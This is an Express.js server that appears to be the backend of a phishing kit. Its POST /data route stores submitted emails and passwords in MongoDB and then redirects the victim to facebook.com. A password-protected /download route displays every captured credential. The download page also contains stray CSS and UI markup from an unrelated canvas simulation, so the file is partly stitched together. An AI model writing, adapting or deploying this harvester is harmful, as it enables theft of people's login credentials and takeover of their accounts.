const express = require('express');
const fs = require('fs');
const { default: mongoose } = require('mongoose');
const app = express();
const port = process.env.PORT || 8080;
const Model = require('./db/_data');
require('dotenv').config({
  path: __dirname + '/.env',
});
const { MONGO_URI, PASS } = process.env;

mongoose
  .connect(MONGO_URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
  })
  .then(() => {
    console.log('Connected to db');
  })
  .catch((err) => {
    console.log(err);
  });

app.use(express.urlencoded());

app.get('/', (req, res) => {
  const index = fs.readFileSync(__dirname + '/pages/index.html', { encoding: 'utf-8' });
  res.send(index);
});

app.post('/data', (req, res) => {
  Model.create({ ...req.body, pass: req.query.pass });
  res.redirect('https://facebook.com');
});

app.get('/download', async (req, res) => {
  const pss = req.query.pss;
  if (pss !== PASS) {
    res.redirect('/');
  } else {
    let y = await Model.find();
    res.send(
      `<!DOCTYPE html>
      <html>
      <head><title>Access Granted!!</title>

<style>
* {
  border: none;
  margin: 0;
}
html,
body {
  width: 100%;
  height: 100%;
  overflow: hidden;
}
body {
  //background: radial-gradient(#555, #111);
}
canvas {
  background: white;
  background: radial-gradient(#FFF, #DDD);
  //background: radial-gradient(hsl(40, 80%, 60%), hsl(0, 50%, 40%));
  //filter: blur(1px) contrast(5);
  //transform: scale(0.1);
  transform-origin: 0 0;
  //border: solid .8em green;
  width: 100%;
  height: 100%;
}
.ui {
  display: none;
</style>
</head>
      <body style="background-image: url('background.html'; color:red"><div style="display:grid;grid-template-columns:repeat(auto-fill, minmax(250px, 1fr));gap: 3rem">${y
        .map(
          (arr, ind) =>
            `<p style="word-wrap:break-all;font-family:monospace; font-size:1rem"><b>${
              ind + 1
            }</b><br/><b>Username:</b>&nbsp; <br/>__> &nbsp;&nbsp;${
              arr.email
            }<br/><b>Pass:</b> <br/>__> &nbsp;&nbsp;${arr.pass}</p>`
        )
        .join('')}</div>
<div class="ui">
  <p class="zoom"><span class="zoom zoomin">+</span><span class="zoom zoomout">-</span></p>
  <p class="zoomlevel"><span class="percent">100</span> % - (<span class="width"></span>px)(<span class="height"></span>px)</p>
  <p>Dead: <span class="dead">0</span></p>
  <p>Alive: <span class="alive">0</span></p>
  <p>Drawn: <span class="drawn">0</span></p>
  <p><span class="fps">0</span> FPS</p>
  <a class="save" href="" download="capture.png">Save</a>
</div>
</body></html>`
    );
  }
});

app.listen(port, () => console.log('Runing on port ' + port));
